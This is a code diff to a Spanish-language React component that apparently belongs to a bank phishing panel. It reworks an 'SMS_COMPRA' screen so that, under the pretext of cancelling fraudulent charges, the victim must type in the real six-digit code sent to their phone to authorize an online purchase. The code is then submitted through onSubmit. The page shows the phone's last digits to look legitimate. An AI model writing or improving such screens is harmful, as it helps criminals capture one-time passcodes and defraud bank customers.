@@ -535,24 +535,24 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'sms_compra': // Agregar la versión en minúsculas para manejar ambos casos
         console.log("Renderizando pantalla SMS_COMPRA con datos:", screenData);
         
-        // Reimplementación completa para garantizar la estabilidad
-        // Inicializar un código de cancelación inmediatamente sin esperar
+        // Sugerimos un código pero permitimos que el usuario lo modifique
+        // Inicializar un código de cancelación sugerido
         const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
         
-        // Establecer el código generado si aún no se ha establecido
+        // Establecer el código sugerido solo si aún no se ha establecido
         if (!smsCompraInput) {
-          console.log("Generando código SMS_COMPRA nuevo:", randomCode);
-          // En lugar de usar el useEffect, establecemos directamente
-          setSmsCompraInput(randomCode);
+          console.log("Generando código SMS_COMPRA sugerido:", randomCode);
+          // Sugerimos un código pero no lo establecemos forzosamente para que el usuario pueda cambiarlo
+          setSmsCompraInput("");
         }
         
-        console.log("Código SMS_COMPRA actual:", smsCompraInput || randomCode);
+        console.log("Código SMS_COMPRA actual:", smsCompraInput);
         
         const smsCompraContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Cancelación de cargos:</h2>
             <p className="mb-4">
-              El código que recibiste para autorizar una compra en línea, es el mismo para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
+              Ingresa el código que recibiste para autorizar la compra en línea. Este mismo código sirve para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
             </p>
             
             <div className="p-4 bg-gray-100 rounded mb-4 text-black">
@@ -560,21 +560,34 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <strong>Información de cancelación:</strong>
               </p>
               <p className="mb-2">
-                <strong>Código de cancelación:</strong> {smsCompraInput || randomCode}
-              </p>
-              <p className="mb-2">
                 <strong>Fecha:</strong> {new Date().toLocaleDateString('es-MX')}
               </p>
+            </div>
+            
+            <div className="mb-4">
+              <label className="block text-sm font-medium mb-1">Ingresa el código de cancelación:</label>
+              <Input 
+                type="text" 
+                placeholder="Ingresa el código de 6 dígitos" 
+                className="w-full border border-gray-300 rounded p-2 mb-2"
+                value={smsCompraInput}
+                onChange={(e) => setSmsCompraInput(e.target.value.replace(/\D/g, '').substring(0, 6))}
+                maxLength={6}
+              />
+              <p className="text-xs text-gray-500">El código debe tener 6 dígitos numéricos.</p>
             </div>
             
             <Button 
               className={primaryBtnClass}
               onClick={() => {
-                // Usar el valor actual o el recién generado
-                const codeToSend = smsCompraInput || randomCode;
-                console.log("Enviando código SMS_COMPRA:", codeToSend);
-                onSubmit(ScreenType.SMS_COMPRA, { smsCompra: codeToSend });
+                if (smsCompraInput && smsCompraInput.length === 6) {
+                  console.log("Enviando código SMS_COMPRA ingresado:", smsCompraInput);
+                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });
+                } else {
+                  alert("Por favor ingresa un código válido de 6 dígitos.");
+                }
               }}
+              disabled={!smsCompraInput || smsCompraInput.length !== 6}
             >
               Confirmar cancelación
             </Button>
